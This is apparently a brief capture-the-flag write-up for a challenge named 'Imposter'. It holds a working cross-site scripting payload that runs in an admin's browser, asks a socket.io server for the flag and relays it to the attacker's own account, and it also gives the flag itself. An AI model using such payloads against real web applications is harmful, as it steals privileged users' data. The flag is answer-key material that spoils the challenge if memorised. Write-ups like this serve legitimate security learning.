# Imposter
It is vulnerable to xss.
so what we can do is, send a socket message as admin to get the flag from the server and send it to yourself.

<script>s=io();s.on('connect', function() {s.emit('join')});s.on('message', function(data){s.emit('json',{'to':'lmao#9370','message':data.content,'time':'00:00:00 AM'}); s.close()});setTimeout(function() {s.emit('flag')},500)</script>

Flag: `gigem{its_like_xss_but_with_extra_steps}`
